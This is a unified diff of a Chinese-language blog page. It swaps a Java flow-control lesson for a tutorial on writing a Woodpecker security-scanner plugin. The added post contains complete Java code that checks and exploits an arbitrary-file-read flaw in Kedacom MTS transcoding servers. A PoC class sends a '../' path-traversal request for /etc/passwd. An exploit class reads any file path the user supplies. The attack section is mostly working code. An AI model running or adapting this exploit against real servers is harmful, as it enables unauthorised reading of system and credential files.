@@ -6,17 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>JAVA学习_day03 | ruia的个人博客</title>
+  <title>woodpecker | ruia的个人博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Java流程控制">
+  <meta name="description" content="Woodpecker插件编写框架规范与编写 创建项目 生成器选择Meven 项目名：漏洞名-vuldb archetype：maven-archetype-quickstart 高级设置内的groupID改为：me.gv7.woodpecker.plugin  woodpecker框架加载插件时入口寻找WoodpeckerPluginManager这样的类名 WoodpeckerPluginMan">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JAVA学习_day03">
-<meta property="og:url" content="http://example.com/2023/03/28/JAVA_day03/index.html">
+<meta property="og:title" content="woodpecker">
+<meta property="og:url" content="http://example.com/2023/04/17/woodpecker/index.html">
 <meta property="og:site_name" content="ruia的个人博客">
-<meta property="og:description" content="Java流程控制">
+<meta property="og:description" content="Woodpecker插件编写框架规范与编写 创建项目 生成器选择Meven 项目名：漏洞名-vuldb archetype：maven-archetype-quickstart 高级设置内的groupID改为：me.gv7.woodpecker.plugin  woodpecker框架加载插件时入口寻找WoodpeckerPluginManager这样的类名 WoodpeckerPluginMan">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-03-28T05:41:43.000Z">
-<meta property="article:modified_time" content="2023-03-28T07:14:54.668Z">
+<meta property="article:published_time" content="2023-04-17T05:27:53.000Z">
+<meta property="article:modified_time" content="2023-04-17T05:28:23.306Z">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="ruia的个人博客" type="application/atom+xml">
@@ -145,111 +145,69 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-JAVA_day03" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-woodpecker" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      JAVA学习_day03
+      woodpecker
     </h1>
   
 
         
-        <a href="/2023/03/28/JAVA_day03/" class="archive-article-date">
-  	<time datetime="2023-03-28T05:41:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-03-28</time>
+        <a href="/2023/04/17/woodpecker/" class="archive-article-date">
+  	<time datetime="2023-04-17T05:27:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-04-17</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="Java流程控制"><a href="#Java流程控制" class="headerlink" title="Java流程控制"></a>Java流程控制</h3><span id="more"></span>
+        <h2 id="Woodpecker插件编写"><a href="#Woodpecker插件编写" class="headerlink" title="Woodpecker插件编写"></a>Woodpecker插件编写</h2><h3 id="框架规范与编写"><a href="#框架规范与编写" class="headerlink" title="框架规范与编写"></a>框架规范与编写</h3><ol>
+<li><p>创建项目</p>
+<p>生成器选择Meven</p>
+<p>项目名：漏洞名-vuldb</p>
+<p>archetype：maven-archetype-quickstart</p>
+<p>高级设置内的groupID改为：me.gv7.woodpecker.plugin</p>
+</li>
+<li><p>woodpecker框架加载插件时入口寻找WoodpeckerPluginManager这样的类名</p>
+<p><code>WoodpeckerPluginManager</code>实现<code>IPluginManager</code>接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WoodpeckerPluginManager</span> <span class="keyword">implements</span> <span class="title class_">IPluginManager</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerPluginManagerCallbacks</span><span class="params">(IPluginManagerCallbacks iPluginManagerCallbacks)</span> &#123;</span><br><span class="line">        iPluginManagerCallbacks.registerVulPlugin(<span class="keyword">new</span> <span class="title class_">KedacomMTSVulPlugin</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="scanner"><a href="#scanner" class="headerlink" title="scanner"></a>scanner</h4><ul>
-<li>next():<ol>
-<li>一定要读取到有效字符后才可以结束输入</li>
-<li>对输入有效字符之前遇到的空白，next()方法会自动去除</li>
-<li>只有输入有效字符后才能将其后面输入的空白作为分隔符或者结束符</li>
-<li>next(不能得到带有空格的字符串)</li>
+
+</li>
+<li><p>在registerPluginManagerCallbacks方法中告诉woodpecker我们的插件在哪个类中</p>
+</li>
+<li><p>自定义类要实现<code>IVulPlugin</code>接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KedacomMTSVulPlugin</span> <span class="keyword">implements</span> <span class="title class_">IVulPlugin</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IVulPluginCallbacks callbacks;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IPluginHelper pluginHelper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">VulPluginMain</span><span class="params">(IVulPluginCallbacks callbacks)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.callbacks = callbacks;</span><br><span class="line">        <span class="built_in">this</span>.pluginHelper = callbacks.getPluginHelper();</span><br><span class="line">        <span class="comment">//设置插件名称</span></span><br><span class="line">        callbacks.setVulPluginName(<span class="string">&quot;KedacomMTS Any File Read&quot;</span>);</span><br><span class="line">        <span class="comment">//插件版本</span></span><br><span class="line">        callbacks.setVulPluginVersion(<span class="string">&quot;1.0.0&quot;</span>);</span><br><span class="line">        <span class="comment">//插件作者</span></span><br><span class="line">        callbacks.setVulPluginAuthor(<span class="string">&quot;ruia&quot;</span>);</span><br><span class="line">        <span class="comment">//漏洞编号1-10，漏洞官方给定分值</span></span><br><span class="line">        callbacks.setVulCVSS(<span class="number">7.5</span>);</span><br><span class="line">        <span class="comment">//漏洞名称</span></span><br><span class="line">        callbacks.setVulName(<span class="string">&quot;科达 MTS转码服务器 任意文件读取&quot;</span>);</span><br><span class="line">        <span class="comment">//插件介绍</span></span><br><span class="line">        callbacks.setVulDescription(<span class="string">&quot;不经允许的情况下进行服务器的任意文件读取&quot;</span>);</span><br><span class="line">        <span class="comment">//漏洞等级</span></span><br><span class="line">        callbacks.setVulSeverity(<span class="string">&quot;normal&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//漏洞验证模块注册，POC模块只能有一个选择</span></span><br><span class="line">        callbacks.registerPoc(<span class="keyword">new</span> <span class="title class_">KedacomMTSVerify</span>());</span><br><span class="line">        <span class="comment">//漏洞利用模块注册，利用方式可以写多种</span></span><br><span class="line">        List&lt;IExploit&gt; exploitList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;IExploit&gt;();</span><br><span class="line">        exploitList.add(<span class="keyword">new</span> <span class="title class_">KedacomMTSUse</span>());</span><br><span class="line">        <span class="comment">//exploitList.add();</span></span><br><span class="line">        callbacks.registerExploit(exploitList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在自定义的类中我们使用callbacks.registerPoc()和callbacks.registerExploit()注册POC模块和Exploit模块</p>
+</li>
+<li><p>plugin包下创建pocs包，pocs包内创建我们自定义的poc类，POC模块只能有一个，需要实现IPoc接口</p>
+</li>
+<li><p>在poc类中另外创建一个方法写验证方法，继承的doVerify方法只需要调用我们的方法拿到结果输出就行了，返回值内容需要包含：Boolean类型的true或false表示是否存在漏洞，以及String类型的返回内容。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KedacomMTSVerify</span> <span class="keyword">implements</span> <span class="title class_">IPoc</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ITarget左边我们输入目标地址的输入框</span></span><br><span class="line">    <span class="comment">//IScanResult右边poc结果显示的输入框</span></span><br><span class="line">    <span class="comment">//IResultOutput右下运行状态的输入框</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IScanResult <span class="title function_">doVerify</span><span class="params">(ITarget iTarget, IResultOutput iResultOutput)</span>&#123;</span><br><span class="line">        <span class="comment">//拿到框架的输出框</span></span><br><span class="line">        <span class="type">IScanResult</span> <span class="variable">scanResult</span> <span class="operator">=</span> KedacomMTSVulPlugin.pluginHelper.createScanResult();</span><br><span class="line">        <span class="comment">//输出框中的Target信息</span></span><br><span class="line">        scanResult.setTarget(iTarget.getAddress());</span><br><span class="line">        <span class="comment">//调用自己的验证方法,目标从ITargent中获取</span></span><br><span class="line">        Map&lt;String, Object&gt; responseMap = checkGetFile(iTarget.getAddress());</span><br><span class="line">        <span class="comment">//输出框中的Result信息，Boolean类型</span></span><br><span class="line">        scanResult.setExists((Boolean) responseMap.get(<span class="string">&quot;flag&quot;</span>));</span><br><span class="line">        <span class="comment">//输框中的info信息，String类型</span></span><br><span class="line">        scanResult.setMsg((String) responseMap.get(<span class="string">&quot;results&quot;</span>));</span><br><span class="line">        <span class="comment">//右下输出框的内容输出</span></span><br><span class="line">        iResultOutput.infoPrintln((String) responseMap.get(<span class="string">&quot;results&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> scanResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//自定义漏洞验证方法checkGetFile</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Object&gt; <span class="title function_">checkGetFile</span><span class="params">(String address)</span>&#123;</span><br><span class="line">        Map&lt;String,Object&gt; responseMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RawResponse</span> <span class="variable">response</span> <span class="operator">=</span> Requests.get(address+<span class="string">&quot;/../../../../../../etc/passwd&quot;</span>).verify(<span class="literal">false</span>).timeout(<span class="number">5000</span>).send();</span><br><span class="line">            <span class="type">String</span> <span class="variable">responseBody</span> <span class="operator">=</span> ToString.scannerOutString(<span class="keyword">new</span> <span class="title class_">Scanner</span>(response.body()));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (response.statusCode() == <span class="number">200</span>&amp;&amp;responseBody.contains(<span class="string">&quot;root&quot;</span>)&amp;&amp;responseBody.contains(<span class="string">&quot;/bin/bash&quot;</span>))&#123;</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">                result = String.format(<span class="string">&quot;%s存在任意文件读取漏洞！&quot;</span>,address);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                result = String.format(<span class="string">&quot;%s不存在任意文件读取漏洞。&quot;</span>,address);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            result = String.format(<span class="string">&quot;%s不存在任意文件读取漏洞。&quot;</span>,address);</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            responseMap.put(<span class="string">&quot;flag&quot;</span>,flag);</span><br><span class="line">            responseMap.put(<span class="string">&quot;results&quot;</span>,result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> responseMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>plugin包下创建exploit包，exploit包内创建我们自定义的类，漏洞利用模块可以有多个，需要实现IExploit接口</p>
+</li>
+<li><p>IExploit接口有三个要实现的方法：</p>
+<ul>
+<li><p>getExploitTabCaption：模块的名字</p>
+</li>
+<li><p>getExploitCustomArgs：参数定义，可以有多个参数</p>
+</li>
+<li><p>doExploit：利用，代码实现</p>
+</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KedacomMTSUse</span> <span class="keyword">implements</span> <span class="title class_">IExploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//利用模块的名称</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getExploitTabCaption</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Read File&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//参数定义</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IArgsUsageBinder <span class="title function_">getExploitCustomArgs</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//拿到框架的输入框</span></span><br><span class="line">        <span class="type">IArgsUsageBinder</span> <span class="variable">argsUsageBinder</span> <span class="operator">=</span> KedacomMTSVulPlugin.pluginHelper.createArgsUsageBinder();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//参数全都存放到args中，可能不止一个参数</span></span><br><span class="line">        List&lt;IArg&gt; args = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//定义第一个参数filePath</span></span><br><span class="line">        <span class="type">IArg</span> <span class="variable">filePath</span> <span class="operator">=</span> KedacomMTSVulPlugin.pluginHelper.createArg();</span><br><span class="line">        <span class="comment">//设置参数属性</span></span><br><span class="line">        filePath.setDescription(<span class="string">&quot;任意文件读取的地址&quot;</span>);    <span class="comment">//参数的介绍</span></span><br><span class="line">        filePath.setRequired(<span class="literal">true</span>);     <span class="comment">//设为必填项</span></span><br><span class="line">        filePath.setDefaultValue(<span class="string">&quot;/etc/passwd&quot;</span>);    <span class="comment">//参数的默认值</span></span><br><span class="line">        filePath.setName(<span class="string">&quot;filePath&quot;</span>);   <span class="comment">//参数名，给用户看的</span></span><br><span class="line">        <span class="comment">//添加参数</span></span><br><span class="line">        args.add(filePath);</span><br><span class="line">        <span class="comment">//将参数列表添加进输入框中</span></span><br><span class="line">        argsUsageBinder.setArgsList(args);</span><br><span class="line">        <span class="keyword">return</span> argsUsageBinder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//漏洞利用</span></span><br><span class="line">    <span class="comment">//iTarget代表目标地址栏</span></span><br><span class="line">    <span class="comment">//map代表上面定义的参数列表内容</span></span><br><span class="line">    <span class="comment">//iResultOutput代表响应结果输出框</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doExploit</span><span class="params">(ITarget iTarget, Map&lt;String, Object&gt; map, IResultOutput iResultOutput)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//拿到参数内容</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> (String) map.get(<span class="string">&quot;filePath&quot;</span>);</span><br><span class="line">            <span class="comment">//目标地址</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> iTarget.getAddress();</span><br><span class="line"></span><br><span class="line">            <span class="type">RawResponse</span> <span class="variable">response</span> <span class="operator">=</span> Requests.get(address+<span class="string">&quot;/../../../../../../../..&quot;</span>+filePath).verify(<span class="literal">false</span>).timeout(<span class="number">5000</span>).send();</span><br><span class="line">            <span class="type">String</span> <span class="variable">responseBody</span> <span class="operator">=</span> ToString.scannerOutString(<span class="keyword">new</span> <span class="title class_">Scanner</span>(response.body()));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (response.statusCode() == <span class="number">200</span>) &#123;</span><br><span class="line">                iResultOutput.successPrintln(responseBody);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                iResultOutput.failPrintln(responseBody);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            iResultOutput.failPrintln(<span class="string">&quot;读取失败。&quot;</span>+e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ol>
-</li>
-<li>nextLine():<ol>
-<li>以Enter为结束符，也就是说nextLine()返回的是输入回车之前的所有字符</li>
-<li>可以获得空白字符</li>
+<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><ol>
+<li>poc模块和exploit模块地址需要带协议，不带协议的地址会报错</li>
+<li>手动在代码中添加协议也不行</li>
 </ol>
-</li>
-</ul>
-<p>通过Scanner类的<strong>next()与nextLine()方法获取输入</strong>的字符串，在读取前我们一般需要使用<strong>hasNext()与hasNextLine()判断是否还有输入</strong>的数据。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in)  <span class="comment">//输入语句后按下Alt+Enter得到以下内容</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="comment">//创建了一个扫描器对象，用来接收键盘数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><strong>&#x2F;&#x2F;凡是属于IO流的类如果不关闭会一直占用资源</strong></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanner.close();</span><br></pre></td></tr></table></figure>
-
-<p>&#x2F;&#x2F;实例</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ruia.scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">dome02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建一个扫描器对象，用于接收数据</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;使用next方式接收：&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断用户有没有输入字符串</span></span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNext())&#123;</span><br><span class="line">            <span class="comment">//创建一个变量str用来接收用户输入的数据</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;输出的内容为：&quot;</span> + str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//凡是属于IO流的类如果不关闭会一直占用资源</span></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h4 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h4><ul>
-<li><p>Java的基本结构就是顺序结构，除非特别指明，否则就按照顺序一句一句执行</p>
-</li>
-<li><p>顺序就够是最简单的算法结构</p>
-</li>
-<li><p>语句与语句之间，框与框之间是按从上到下的顺序进行的，它是由若干个依次执行的处理步骤组成的，<strong>它是任何一个算法都离不开的一种基本算法结构</strong></p>
-</li>
-</ul>
-<hr>
-<h4 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h4><ul>
-<li><p>if单选择结构</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式)&#123;<span class="comment">//如果布尔表达式为true则执行&#125;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>if双选择结构</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式)&#123;</span><br><span class="line">    <span class="comment">//如果布尔表达式为true则执行</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//如果布尔表达式为false则执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>if多选择结构</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">//如果布尔表达式1为true则执行</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(布尔表达式<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="comment">//如果布尔表达式2为true则执行</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(布尔表达式<span class="number">3</span>)&#123;</span><br><span class="line">    <span class="comment">//如果布尔表达式3为true则执行</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//如果以上布尔表达式都为false则执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>嵌套的if结构</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">//如果布尔表达式1为true则执行</span></span><br><span class="line">	<span class="keyword">if</span>(布尔表达式<span class="number">2</span>)&#123;</span><br><span class="line">    	<span class="comment">//如果布尔表达式2为true则执行</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>switch多选择结构</p>
-<p>switch case语句判断一个变量与一系列值中某个值是否相等，每个值称为一个分支。</p>
-<p>case标签必须为字符串常量或字面量</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(expression)&#123;</span><br><span class="line">    <span class="keyword">case</span> value:</span><br><span class="line">        <span class="comment">//语句</span></span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//可选</span></span><br><span class="line">    <span class="keyword">case</span> value:</span><br><span class="line">        <span class="comment">//语句</span></span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//可选</span></span><br><span class="line">    <span class="keyword">default</span> :</span><br><span class="line">        <span class="comment">//语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<hr>
-<h4 id="lntellij-IDEA反编译class文件"><a href="#lntellij-IDEA反编译class文件" class="headerlink" title="lntellij IDEA反编译class文件"></a>lntellij IDEA反编译class文件</h4><p>文件–&gt;项目结构中可以看到编译后文件的输出地址</p>
-<p>将class文件直接用IDEA的打开功能打开</p>
-<hr>
-<h4 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h4><ul>
-<li>while循环</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(布尔表达式)&#123;</span><br><span class="line">    <span class="comment">//循环语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>do…while循环（程序至少表达一次）</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="comment">//代码语句</span></span><br><span class="line">&#125;<span class="keyword">while</span>(布尔表达式)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>for循环</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(初始化;布尔表达式;更新)&#123;</span><br><span class="line">    <span class="comment">//代码语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>for循环快捷键：100.for</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">100.</span><span class="keyword">for</span></span><br><span class="line"><span class="title function_">for</span> <span class="params">(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>增强for循环（与python中类似）</p>
